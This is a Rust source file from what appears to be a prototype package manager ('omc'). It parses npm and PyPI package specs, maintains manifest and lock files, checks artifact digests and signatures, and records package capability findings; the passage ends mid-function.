use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::str::FromStr;
use std::sync::OnceLock;
use std::{env, fmt};

use base64::{engine::general_purpose::STANDARD, Engine as _};
use ed25519_dalek::{Signature, Signer, SigningKey, Verifier, VerifyingKey};
use flate2::read::GzDecoder;
use omc_cap::{Capability, Policy};
use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op, Value, VirtualPath};
use omc_verify::{verify_module, VerifyFinding};
use rand_core::OsRng;
use reqwest::blocking::Client;
use semver::Version;
use serde::{Deserialize, Serialize};
use sha1::Sha1;
use sha2::{Digest, Sha256, Sha512};
use tar::Archive;
use thiserror::Error;
use walkdir::{DirEntry, WalkDir};

pub type Result<T> = std::result::Result<T, OmcRegistryError>;

const LOCKFILE: &str = "omc.lock";
const MANIFEST: &str = "omc.toml";
const ARTIFACT_SCHEMA: u32 = 1;
const ARTIFACT_SIGNING_KEY: &str = "artifact-ed25519.key";
const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;
const NPM_DIRECT_TARBALL_PLACEHOLDER: &str = "__omc_direct_tarball__";

#[derive(Debug, Error)]
pub enum OmcRegistryError {
    #[error("unsupported package spec `{0}`")]
    UnsupportedSpec(String),
    #[error("unsupported requirements entry `{0}`")]
    UnsupportedRequirement(String),
    #[error("package version was not found: {0}")]
    PackageNotFound(String),
    #[error("blocked package `{spec}`; use --record-blocked to keep the artifact and lock entry")]
    BlockedPackage { spec: String },
    #[error("registry response did not include a downloadable artifact for {0}")]
    MissingArtifact(String),
    #[error("registry response did not include a compatible PyPI archive for {0}")]
    MissingCompatibleWheel(String),
    #[error("could not resolve a version for {name} matching `{requirement}`")]
    UnsatisfiedRequirement { name: String, requirement: String },
    #[error("install requires an accepted lockfile; blocked package remains: {0}")]
    BlockedLockedPackage(String),
    #[error("omc.lock does not satisfy `{0}`; run omc install without --locked to update it")]
    LockfileOutOfDate(String),
    #[error("cannot install unsupported artifact type: {0}")]
    UnsupportedInstallArtifact(String),
    #[error("archive contains an unsafe path: {0}")]
    UnsafeArchivePath(String),
    #[error("downloaded artifact digest mismatch for {name}: expected {expected}, got {actual}")]
    DigestMismatch {
        name: String,
        expected: String,
        actual: String,
    },
    #[error("http error: {0}")]
    Http(#[from] reqwest::Error),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("json error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("toml decode error: {0}")]
    TomlDecode(#[from] toml::de::Error),
    #[error("toml encode error: {0}")]
    TomlEncode(#[from] toml::ser::Error),
    #[error("zip error: {0}")]
    Zip(#[from] zip::result::ZipError),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Ecosystem {
    Npm,
    Pypi,
}

impl fmt::Display for Ecosystem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Npm => f.write_str("npm"),
            Self::Pypi => f.write_str("pypi"),
        }
    }
}

impl FromStr for Ecosystem {
    type Err = OmcRegistryError;

    fn from_str(value: &str) -> Result<Self> {
        match value {
            "npm" => Ok(Self::Npm),
            "pypi" | "py" | "python" => Ok(Self::Pypi),
            _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageSpec {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: Option<String>,
    pub extras: BTreeSet<String>,
    pub direct_url: Option<String>,
}

impl PackageSpec {
    fn new(ecosystem: Ecosystem, name: impl Into<String>, version: Option<String>) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras: BTreeSet::new(),
            direct_url: None,
        }
    }

    fn with_extras(
        ecosystem: Ecosystem,
        name: impl Into<String>,
        version: Option<String>,
        extras: BTreeSet<String>,
    ) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras,
            direct_url: None,
        }
    }

    fn with_direct_url(
        ecosystem: Ecosystem,
        name: impl Into<String>,
        direct_url: impl Into<String>,
        extras: BTreeSet<String>,
    ) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version: None,
            extras,
            direct_url: Some(direct_url.into()),
        }
    }

    pub fn parse(raw: &str) -> Result<Self> {
        let (ecosystem, rest) = raw
            .split_once(':')
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(raw.to_owned()))?;
        let ecosystem = Ecosystem::from_str(ecosystem)?;

        match ecosystem {
            Ecosystem::Npm => parse_npm_spec(raw, rest),
            Ecosystem::Pypi => parse_pypi_spec(rest),
        }
    }

    pub fn package_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name_with_extras())
    }

    fn constraint_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name)
    }

    pub fn requested(&self) -> String {
        if let Some(url) = &self.direct_url {
            return format!("{}:{} @ {}", self.ecosystem, self.name_with_extras(), url);
        }
        match &self.version {
            Some(version) => format!("{}:{}@{}", self.ecosystem, self.name_with_extras(), version),
            None => self.package_key(),
        }
    }

    fn name_with_extras(&self) -> String {
        if self.ecosystem == Ecosystem::Pypi && !self.extras.is_empty() {
            format!(
                "{}[{}]",
                self.name,
                self.extras.iter().cloned().collect::<Vec<_>>().join(",")
            )
        } else {
            self.name.clone()
        }
    }
}

fn parse_npm_spec(raw: &str, rest: &str) -> Result<PackageSpec> {
    if let Some((name, url)) = rest.split_once(" @ ") {
        let name = name.trim();
        let url = url.trim();
        if name.is_empty() || url.is_empty() {
            return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
        }
        return Ok(PackageSpec::with_direct_url(
            Ecosystem::Npm,
            name,
            url,
            BTreeSet::new(),
        ));
    }

    if rest.is_empty() {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    let version_at = if let Some(stripped) = rest.strip_prefix('@') {
        stripped.rfind('@').map(|index| index + 1)
    } else {
        rest.rfind('@')
    };

    let (name, version) = match version_at {
        Some(index) => (&rest[..index], Some(rest[index + 1..].to_owned())),
        None => (rest, None),
    };

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    Ok(PackageSpec::new(Ecosystem::Npm, name, version))
}

fn parse_pypi_spec(rest: &str) -> Result<PackageSpec> {
    if let Some((spec, _)) = parse_pypi_direct_requirement(rest, &BTreeSet::new()) {
        return Ok(spec);
    }

    let (name, version) = if let Some((name, version)) = rest.split_once("==") {
        (name, Some(version.to_owned()))
    } else if let Some((name, version)) = rest.rsplit_once('@') {
        (name, Some(version.to_owned()))
    } else {
        return parse_pypi_requirement(rest)
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    };

    let (name, extras) = parse_pypi_name_and_extras(name);

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    }

    Ok(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        version,
        extras,
    ))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcManifest {
    pub project: ProjectInfo,
    #[serde(default)]
    pub dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "dev-dependencies")]
    pub dev_dependencies: BTreeMap<String, String>,
    #[serde(
        default,
        rename = "npm-local-paths",
        skip_serializing_if = "Vec::is_empty"
    )]
    pub npm_local_paths: Vec<String>,
    #[serde(
        default,
        rename = "npm-dev-local-paths",
        skip_serializing_if = "Vec::is_empty"
    )]
    pub npm_dev_local_paths: Vec<String>,
    #[serde(default, skip_serializing_if = "ManifestPolicy::is_empty")]
    pub policy: ManifestPolicy,
    #[serde(default, skip_serializing_if = "ManifestRegistries::is_empty")]
    pub registries: ManifestRegistries,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectInfo {
    pub name: String,
    pub version: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ManifestPolicy {
    #[serde(default)]
    pub allow: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ManifestRegistries {
    #[serde(default, rename = "pypi-index-url")]
    pub pypi_index_url: Option<String>,
    #[serde(default, rename = "pypi-extra-index-urls")]
    pub pypi_extra_index_urls: Vec<String>,
}

impl ManifestPolicy {
    fn is_empty(&self) -> bool {
        self.allow.is_empty()
    }
}

impl ManifestRegistries {
    fn is_empty(&self) -> bool {
        self.pypi_index_url.is_none() && self.pypi_extra_index_urls.is_empty()
    }
}

impl OmcManifest {
    pub fn new(name: impl Into<String>) -> Self {
        Self {
            project: ProjectInfo {
                name: name.into(),
                version: "0.1.0".to_owned(),
            },
            dependencies: BTreeMap::new(),
            dev_dependencies: BTreeMap::new(),
            npm_local_paths: Vec::new(),
            npm_dev_local_paths: Vec::new(),
            policy: ManifestPolicy::default(),
            registries: ManifestRegistries::default(),
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct OmcLock {
    pub version: u32,
    #[serde(default)]
    pub packages: Vec<LockedPackage>,
    #[serde(default)]
    pub python_vcs: Vec<LockedPythonVcsDependency>,
}

impl OmcLock {
    pub fn new() -> Self {
        Self {
            version: 1,
            packages: Vec::new(),
            python_vcs: Vec::new(),
        }
    }

    fn upsert(&mut self, package: LockedPackage) {
        if let Some(existing) = self.packages.iter_mut().find(|entry| {
            entry.ecosystem == package.ecosystem
                && entry.name == package.name
                && entry.version == package.version
        }) {
            *existing = package;
        } else {
            self.packages.push(package);
            self.packages.sort_by(|left, right| {
                (
                    left.ecosystem,
                    left.name.as_str(),
                    left.version.as_str(),
                    left.sha256.as_str(),
                )
                    .cmp(&(
                        right.ecosystem,
                        right.name.as_str(),
                        right.version.as_str(),
                        right.sha256.as_str(),
                    ))
            });
        }
    }

    fn replace_python_vcs(&mut self, mut dependencies: Vec<LockedPythonVcsDependency>) {
        dependencies.sort_by(|left, right| {
            (
                left.name.as_str(),
                left.url.as_str(),
                left.reference.as_deref().unwrap_or_default(),
                left.subdirectory.as_deref().unwrap_or_default(),
                left.extras.as_slice(),
            )
                .cmp(&(
                    right.name.as_str(),
                    right.url.as_str(),
                    right.reference.as_deref().unwrap_or_default(),
                    right.subdirectory.as_deref().unwrap_or_default(),
                    right.extras.as_slice(),
                ))
        });
        dependencies
            .dedup_by(|left, right| python_vcs_lock_key(left) == python_vcs_lock_key(right));
        self.python_vcs = dependencies;
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LockedPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
    pub source_url: String,
    pub archive: String,
    pub artifact: String,
    pub sha256: String,
    pub behavior: Behavior,
    pub verdict: Verdict,
    #[serde(default)]
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub optional_dependencies: Vec<String>,
    #[serde(default)]
    pub grants: Vec<String>,
    #[serde(default)]
    pub capabilities: Vec<CapabilityFinding>,
    #[serde(default)]
    pub verifier_findings: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LockedPythonVcsDependency {
    pub name: String,
    pub url: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reference: Option<String>,
    pub resolved_commit: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub archive: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub sha256: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub subdirectory: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub extras: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Behavior {
    Pure,
    HostCapability,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    Accepted,
    Blocked,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct CapabilityFinding {
    pub kind: CapabilityKind,
    pub target: String,
    pub source: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CapabilityKind {
    EnvRead,
    FsRead,
    FsWrite,
    HttpRequest,
    ProcSpawn,
    DynamicEval,
}

impl fmt::Display for CapabilityKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EnvRead => f.write_str("env_read"),
            Self::FsRead => f.write_str("fs_read"),
            Self::FsWrite => f.write_str("fs_write"),
            Self::HttpRequest => f.write_str("http_request"),
            Self::ProcSpawn => f.write_str("proc_spawn"),
            Self::DynamicEval => f.write_str("dynamic_eval"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcArtifact {
    pub schema: u32,
    pub package: ArtifactPackage,
    pub source_url: String,
    pub source_sha256: String,
    pub compiler: String,
    pub microcode: Module,
    pub behavior: Behavior,
    pub verdict: Verdict,
    pub grants: Vec<String>,
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub optional_dependencies: Vec<String>,
    pub files_scanned: usize,
    pub capabilities: Vec<CapabilityFinding>,
    pub verifier_findings: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signature: Option<ArtifactSignature>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArtifactPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ArtifactSignature {
    pub algorithm: String,
    pub key_id: String,
    pub public_key: String,
    pub payload_sha256: String,
    pub signature: String,
}

#[derive(Debug, Clone)]
pub struct LinkOptions {
    pub project_dir: PathBuf,
    pub record_blocked: bool,
    pub allowed_capabilities: Vec<Capability>,
    pub constraints: BTreeMap<String, String>,
    pub hashes: BTreeMap<String, BTreeSet<String>>,
    pub npm_integrities: BTreeMap<String, BTreeSet<String>>,
    pub npm_resolved: BTreeMap<String, String>,
    pub pypi_index_url: Option<String>,
    pub pypi_extra_index_urls: Vec<String>,
    pub pypi_find_links: Vec<String>,
    pub pypi_no_index: bool,
    pub pypi_require_hashes: bool,
    pub npm_local_paths: Vec<PathBuf>,
    pub python_local_paths: Vec<PathBuf>,
    pub python_vcs_requirements: Vec<PythonVcsRequirement>,
    pub python_vcs_locks: Vec<LockedPythonVcsDependency>,
    pub requirement_files: Vec<PathBuf>,
    pub constraint_files: Vec<PathBuf>,
    pub project_extras: BTreeSet<String>,
    pub include_dev_dependencies: bool,
    pub save_manifest_dependency: bool,
    pub save_dev_dependency: bool,
}

impl LinkOptions {
    pub fn new(project_dir: impl Into<PathBuf>) -> Self {
        Self {
            project_dir: project_dir.into(),
            record_blocked: false,
            allowed_capabilities: Vec::new(),
            constraints: BTreeMap::new(),
            hashes: BTreeMap::new(),
            npm_integrities: BTreeMap::new(),
            npm_resolved: BTreeMap::new(),
            pypi_index_url: None,
            pypi_extra_index_urls: Vec::new(),
            pypi_find_links: Vec::new(),
            pypi_no_index: false,
            pypi_require_hashes: false,
            npm_local_paths: Vec::new(),
            python_local_paths: Vec::new(),
            python_vcs_requirements: Vec::new(),
            python_vcs_locks: Vec::new(),
            requirement_files: Vec::new(),
            constraint_files: Vec::new(),
            project_extras: BTreeSet::new(),
            include_dev_dependencies: true,
            save_manifest_dependency: true,
            save_dev_dependency: false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LinkReport {
    pub locked: LockedPackage,
    pub artifact: OmcArtifact,
    pub lockfile: PathBuf,
    pub manifest: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct InstallReport {
    pub npm_packages: usize,
    pub pypi_packages: usize,
    pub npm_bins: usize,
    pub python_scripts: usize,
    pub node_modules: PathBuf,
    pub npm_bin_dir: PathBuf,
    pub python_site_packages: PathBuf,
    pub python_bin_dir: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct ProjectRequirements {
    pub specs: Vec<PackageSpec>,
    pub constraints: BTreeMap<String, String>,
    pub hashes: BTreeMap<String, BTreeSet<String>>,
    pub npm_integrities: BTreeMap<String, BTreeSet<String>>,
    pub npm_resolved: BTreeMap<String, String>,
    pub pypi_index_url: Option<String>,
    pub pypi_extra_index_urls: Vec<String>,
    pub pypi_find_links: Vec<String>,
    pub pypi_no_index: bool,
    pub pypi_require_hashes: bool,
    pub python_local_paths: Vec<PathBuf>,
    pub python_vcs_requirements: Vec<PythonVcsRequirement>,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct PythonVcsRequirement {
    pub name: String,
    pub url: String,
    pub reference: Option<String>,
    pub subdirectory: Option<PathBuf>,
    pub extras: BTreeSet<String>,
}

#[derive(Debug, Clone, Default)]
struct PythonVcsResolveResult {
    requirements: ProjectRequirements,
    locks: Vec<LockedPythonVcsDependency>,
}

fn extend_project_requirements(
    target: &mut ProjectRequirements,
    requirements: ProjectRequirements,
) {
    target.specs.extend(requirements.specs);
    target.constraints.extend(requirements.constraints);
    target.hashes.extend(requirements.hashes);
    target.npm_integrities.extend(requirements.npm_integrities);
    target.npm_resolved.extend(requirements.npm_resolved);
    if requirements.pypi_index_url.is_some() {
        target.pypi_index_url = requirements.pypi_index_url;
    }
    target
        .pypi_extra_index_urls
        .extend(requirements.pypi_extra_index_urls);
    target.pypi_find_links.extend(requirements.pypi_find_links);
    target.pypi_no_index |= requirements.pypi_no_index;
    target.pypi_require_hashes |= requirements.pypi_require_hashes;
    target
        .python_local_paths
        .extend(requirements.python_local_paths);
    target
        .python_vcs_requirements
        .extend(requirements.python_vcs_requirements);
}

fn apply_project_requirements_to_options(
    options: &mut LinkOptions,
    specs: &mut Vec<PackageSpec>,
    requirements: ProjectRequirements,
) {
    specs.extend(requirements.specs);
    options.constraints.extend(requirements.constraints);
    options.hashes.extend(requirements.hashes);
    options.npm_integrities.extend(requirements.npm_integrities);
    options.npm_resolved.extend(requirements.npm_resolved);
    if requirements.pypi_index_url.is_some() {
        options.pypi_index_url = requirements.pypi_index_url;
    }
    options
        .pypi_extra_index_urls
        .extend(requirements.pypi_extra_index_urls);
    options.pypi_find_links.extend(requirements.pypi_find_links);
    options.pypi_no_index |= requirements.pypi_no_index;
    options.pypi_require_hashes |= requirements.pypi_require_hashes;
    options
        .python_local_paths
        .extend(requirements.python_local_paths);
    options
        .python_vcs_requirements
        .extend(requirements.python_vcs_requirements);
}

#[derive(Debug, Clone)]
struct ResolvedPackage {
    ecosystem: Ecosystem,
    name: String,
    version: String,
    source_url: String,
    download_url: Option<String>,
    local_path: Option<PathBuf>,
    filename: String,
    expected_sha256: Option<String>,
    expected_sha1: Option<String>,
    expected_integrity: Option<String>,
    npm_direct_tarball: bool,
    pypi_direct_wheel: bool,
    npm_scripts: BTreeMap<String, String>,
    platform_compatible: bool,
    dependencies: Vec<PackageDependency>,
}

#[derive(Debug, Clone)]
struct PackageDependency {
    spec: PackageSpec,
    optional: bool,
}

pub fn init_project(project_dir: impl AsRef<Path>, name: Option<&str>) -> Result<PathBuf> {
    let project_dir = project_dir.as_ref();
    fs::create_dir_all(project_dir.join(".omc"))?;

    let manifest_path = project_dir.join(MANIFEST);
    if !manifest_path.exists() {
        let project_name = name.map(str::to_owned).unwrap_or_else(|| {
            project_dir
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("omc-project")
                .to_owned()
        });
        let manifest = OmcManifest::new(project_name);
        fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    }

    let lockfile_path = project_dir.join(LOCKFILE);
    if !lockfile_path.exists() {
        fs::write(&lockfile_path, toml::to_string_pretty(&OmcLock::new())?)?;
    }

    Ok(manifest_path)
}

pub fn link_package(spec: &PackageSpec, options: &LinkOptions) -> Result<LinkReport> {
    init_project(&options.project_dir, None)?;
    let options = options_with_manifest_policy(options)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let (report, _) = link_package_inner(&client, spec, false, &options, true)?
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    Ok(report)
}

pub fn add_package_graph(spec: &PackageSpec, options: &LinkOptions) -> Result<Vec<LinkReport>> {
    init_project(&options.project_dir, None)?;
    let options = options_with_manifest_policy(options)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let reports = resolve_package_graph(&client, spec, &options)?;

    if options.save_manifest_dependency {
        let Some(root) = reports.first() else {
            return Ok(reports);
        };
        let spec = manifest_spec_for_locked_root(spec, &root.locked);
        write_manifest_dependency(
            &options.project_dir,
            &spec,
            &root.locked.version,
            options.save_dev_dependency,
        )?;
    }

    Ok(reports)
}

pub fn remove_manifest_dependency(
    project_dir: impl AsRef<Path>,
    spec: &PackageSpec,
) -> Result<bool> {
    let project_dir = project_dir.as_ref();
    init_project(project_dir, None)?;

    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let removed = manifest.dependencies.remove(&spec.package_key()).is_some()
        || manifest
            .dev_dependencies
            .remove(&spec.package_key())
            .is_some();
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(removed)
}

pub fn add_manifest_npm_local_paths(
    project_dir: impl AsRef<Path>,
    paths: &[PathBuf],
    dev_dependency: bool,
) -> Result<Vec<String>> {
    let project_dir = project_dir.as_ref();
    init_project(project_dir, None)?;

    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let (target, other) = if dev_dependency {
        (
            &mut manifest.npm_dev_local_paths,
            &mut manifest.npm_local_paths,
        )
    } else {
        (
            &mut manifest.npm_local_paths,
            &mut manifest.npm_dev_local_paths,
        )
    };
    let mut existing = target.iter().cloned().collect::<BTreeSet<_>>();
    let mut added = Vec::new();
    for path in paths {
        let path = path.to_string_lossy().into_owned();
        other.retain(|existing| existing != &path);
        if existing.insert(path.clone()) {
            added.push(path);
        }
    }
    *target = existing.into_iter().collect();
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(added)
}

pub fn add_manifest_policy_grants(
    project_dir: impl AsRef<Path>,
    grants: &[String],
) -> Result<Vec<String>> {
    let project_dir = project_dir.as_ref();
    init_project(project_dir, None)?;

    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let mut existing = manifest
        .policy
        .allow
        .iter()
        .cloned()
        .collect::<BTreeSet<_>>();
    let mut added = Vec::new();
    for grant in grants {
        let normalized = parse_capability_grant(grant)?.to_string();
        if existing.insert(normalized.clone()) {
            added.push(normalized);
        }
    }
    manifest.policy.allow = existing.into_iter().collect();
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(added)
}

pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    lock_project_options(&mut options)?;
    let lock = read_lockfile(options.project_dir.join(LOCKFILE))?;
    let mut report = install_lock(&options.project_dir, &lock)?;
    report.npm_bins += install_npm_project_links(
        &options.project_dir,
        &report.node_modules,
        &report.npm_bin_dir,
        options.include_dev_dependencies,
    )?;
    report.npm_bins += install_npm_direct_local_links(
        &options.npm_local_paths,
        &report.node_modules,
        &report.npm_bin_dir,
    )?;
    report.python_scripts += install_python_local_paths(
        &options.python_local_paths,
        &report.python_site_packages,
        &report.python_bin_dir,
    )?;
    Ok(report)
}

pub fn lock_project(options: &LinkOptions) -> Result<Vec<LinkReport>> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    lock_project_options(&mut options)
}

fn lock_project_options(options: &mut LinkOptions) -> Result<Vec<LinkReport>> {
    let specs = project_requested_specs(options, false)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let mut seen_roots = BTreeSet::new();
    let mut retained = BTreeSet::new();
    let mut reports = Vec::new();
    for spec in specs {
        if !seen_roots.insert(spec.requested()) {
            continue;
        }
        for report in resolve_package_graph(&client, &spec, options)? {
            retained.insert(locked_package_key(&report.locked));
            reports.push(report);
        }
    }

    prune_lockfile(&options.project_dir, &retained)?;
    sync_python_vcs_lockfile(&options.project_dir, options.python_vcs_locks.clone())?;
    Ok(reports)
}

pub fn install_locked_project(options: &LinkOptions) -> Result<InstallReport> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    let specs = project_requested_specs(&mut options, true)?;
    let lock = read_lockfile(options.project_dir.join(LOCKFILE))?;
    let retained = locked_reachable_package_keys(&lock, &specs, &options)?;
    let mut selected = lock;
    selected
        .packages
        .retain(|package| retained.contains(&locked_package_key(package)));

    let mut report = install_lock(&options.project_dir, &selected)?;
    report.npm_bins += install_npm_project_links(
        &options.project_dir,
        &report.node_modules,
        &report.npm_bin_dir,
        options.include_dev_dependencies,
    )?;
    report.npm_bins += install_npm_direct_local_links(
        &options.npm_local_paths,
        &report.node_modules,
        &report.npm_bin_dir,
    )?;
    report.python_scripts += install_python_local_paths(
        &options.python_local_paths,
        &report.python_site_packages,
        &report.python_bin_dir,
    )?;
    Ok(report)
}

fn project_requested_specs(options: &mut LinkOptions, locked: bool) -> Result<Vec<PackageSpec>> {
    let manifest = read_manifest(options.project_dir.join(MANIFEST))?;
    apply_manifest_config(&manifest, options)?;
    let mut specs = Vec::new();
    for (key, requirement) in manifest.dependencies {
        specs.push(parse_manifest_dependency(&key, &requirement)?);
    }
    if options.include_dev_dependencies {
        for (key, requirement) in manifest.dev_dependencies {
            specs.push(parse_manifest_dependency(&key, &requirement)?);
        }
    }
    let discovered = discover_project_requirements_with_options(
        &options.project_dir,
        &options.project_extras,
        options.include_dev_dependencies,
    )?;
    apply_project_requirements_to_options(options, &mut specs, discovered);

    if !options.requirement_files.is_empty() {
        let requirements = read_requirements_files(&options.requirement_files)?;
        apply_project_requirements_to_options(options, &mut specs, requirements);
    }
    if !options.constraint_files.is_empty() {
        let requirements = read_constraint_files(&options.constraint_files)?;
        apply_project_requirements_to_options(options, &mut specs, requirements);
    }

    if !options.python_vcs_requirements.is_empty() {
        let lock = if locked {
            Some(read_lockfile(options.project_dir.join(LOCKFILE))?)
        } else {
            None
        };
        let resolved = resolve_python_vcs_requirements(
            &options.project_dir,
            &options.python_vcs_requirements,
            lock.as_ref().map(|lock| lock.python_vcs.as_slice()),
        )?;
        options.python_vcs_locks.extend(resolved.locks);
        apply_project_requirements_to_options(options, &mut specs, resolved.requirements);
    }

    if options.pypi_require_hashes {
        enforce_pypi_hashes_for_specs(&specs, &options.hashes, &options.constraints)?;
    }

    let mut seen = BTreeSet::new();
    specs.retain(|spec| seen.insert(spec.requested()));
    Ok(specs)
}

fn parse_manifest_dependency(key: &str, requirement: &str) -> Result<PackageSpec> {
    if is_direct_dependency_requirement(requirement) {
        return PackageSpec::parse(&format!("{key} @ {requirement}"));
    }
    PackageSpec::parse(&format!("{key}@{requirement}"))
}

fn is_direct_dependency_requirement(requirement: &str) -> bool {
    requirement.starts_with("https://")
        || requirement.starts_with("file:")
        || requirement.starts_with("git+")
}

fn resolve_python_vcs_requirements(
    project_dir: &Path,
    requirements: &[PythonVcsRequirement],
    locked: Option<&[LockedPythonVcsDependency]>,
) -> Result<PythonVcsResolveResult> {
    let mut resolved = ProjectRequirements::default();
    let mut locks = Vec::new();
    let mut queue = requirements.to_vec();
    let mut seen = BTreeSet::new();

    while let Some(requirement) = queue.pop() {
        if !seen.insert(requirement.clone()) {
            continue;
        }
        let (source_requirements, lock) =
            resolve_python_vcs_requirement(project_dir, &requirement, locked)?;
        queue.extend(source_requirements.python_vcs_requirements.clone());
        extend_project_requirements(&mut resolved, source_requirements);
        locks.push(lock);
    }

    Ok(PythonVcsResolveResult {
        requirements: resolved,
        locks,
    })
}

fn resolve_python_vcs_requirement(
    project_dir: &Path,
    requirement: &PythonVcsRequirement,
    locked: Option<&[LockedPythonVcsDependency]>,
) -> Result<(ProjectRequirements, LockedPythonVcsDependency)> {
    let checkout_dir = python_vcs_checkout_dir(project_dir, requirement);
    let locked_dependency = locked
        .map(|locks| find_locked_python_vcs_dependency(locks, requirement))
        .transpose()?
        .flatten();
    if locked.is_some() && locked_dependency.is_none() {
        return Err(OmcRegistryError::LockfileOutOfDate(format!(
            "pypi:{} @ git+{}",
            requirement.name, requirement.url
        )));
    }
    let restored_from_cache = locked_dependency
        .as_ref()
        .map(|dependency| restore_python_vcs_archive(project_dir, &checkout_dir, dependency))
        .transpose()?
        .unwrap_or(false);
    let resolved_commit = if restored_from_cache {
        locked_dependency
            .as_ref()
            .map(|dependency| dependency.resolved_commit.clone())
            .unwrap_or_default()
    } else {
        let checkout_reference = locked_dependency
            .as_ref()
            .map(|dependency| dependency.resolved_commit.as_str())
            .or(requirement.reference.as_deref());
        checkout_python_vcs_dependency(
            &checkout_dir,
            requirement,
            checkout_reference,
            locked.is_some(),
        )?;
        git_rev_parse_head(&checkout_dir, &requirement.name)?
    };

    let package_dir = if let Some(subdirectory) = requirement.subdirectory.as_deref() {
        checked_join(&checkout_dir, subdirectory)?
    } else {
        checkout_dir.clone()
    };
    if !package_dir.is_dir() {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "VCS dependency `{}` did not contain package directory `{}`",
            requirement.name,
            package_dir.display()
        )));
    }

    let mut resolved = read_python_source_requirements(&package_dir, &requirement.extras)?;
    push_python_local_path(&mut resolved, package_dir);
    let mut lock = locked_python_vcs_dependency(requirement, resolved_commit);
    if let Some(existing) = locked_dependency {
        lock.archive = existing.archive;
        lock.sha256 = existing.sha256;
    }
    if lock.archive.is_empty()
        || lock.sha256.is_empty()
        || !project_dir.join(&lock.archive).exists()
    {
